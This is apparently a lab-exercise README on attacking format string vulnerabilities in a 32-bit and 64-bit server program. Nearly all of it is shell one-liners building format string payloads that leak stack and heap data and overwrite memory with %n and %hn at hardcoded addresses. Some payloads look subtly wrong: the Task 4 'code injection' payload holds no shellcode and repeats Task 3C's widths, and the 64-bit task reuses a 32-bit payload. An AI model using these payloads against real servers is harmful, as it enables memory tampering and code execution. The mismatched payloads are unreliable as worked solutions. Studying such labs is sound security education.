# Format-String-Vulnerability-Attack

## Overview

This project focuses on exploiting format string vulnerabilities in server programs. The objective is to understand and exploit these vulnerabilities to manipulate or read memory.

## Project Structure

- **`build_string.py`**: Script to create format string payloads.
- **`exploit.py`**: Script to execute the exploit payloads.
- **`fmt-containers/`**: Contains format string containers for 32-bit and 64-bit programs.
- **`Dockerfile`**: Dockerfile to build the environment.
- **`docker-compose.yml`**: Docker Compose configuration to run the services.
- **`input/`**: Directory for input files.
- **`README.md`**: This file.

## Tasks

### Task 1: Basic Format String Exploitation

Create a payload to display stack data using format string specifiers.
```bash
%s%s%s%s%s
```

### Task 2: Printing Out the Server Programâ€™s Memory
#### Task 2A: Stack Data Manipulation

Determine the exact number of format specifiers needed to correctly access specific memory addresses.
```bash
exact num--
@@@@%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x
```

#### Task 2B: Heap Data Manipulation

Modify heap data using format string vulnerabilities.
```bash
echo $(printf "\x08\x40\x0b\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%s > input
```

### Task 3: Modifying the Server Programâ€™s Memory
#### Task 3A: Modify Server Memory Value

Change a specific memory value to a different value using a format string attack.
```bash
echo $(printf "\x68\x50\x0e\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%n > input
```

#### Task 3B: Set Memory Value to 0x5000

Change the memory value to 0x5000 using format string attacks.
```bash
echo $(printf "\x68\x50\x0e\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.19917x_%n > input
```

#### Task 3C: Large Value Modification

Modify the memory value to a large number (0xAABBCCDD) efficiently using format specifiers `%hn` or `%hhn`.
```bash
echo $(printf "\x6a\x50\x0e\x08@@@@\x68\x50\x0e\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.43136x_%hn%.8737x_%hn > input
```

### Task 4: Inject Malicious Code into the Server Program

Inject malicious code into the server's memory and exploit format string vulnerabilities to execute it.
```bash
echo $(printf "\x1e\xd3\xff\xff@@@@\x1c\xd3\xff\xff")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.43136x_%hn%.8737x_%hn > input
```

### Task 5: Attacking the 64-bit Server Program

Apply similar techniques to exploit format string vulnerabilities in a 64-bit server program.
```bash
echo $(printf "\x68\x50\x0e\x08@@@@\x68\x50\x0e\x08")%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%.8x_%n > input
```
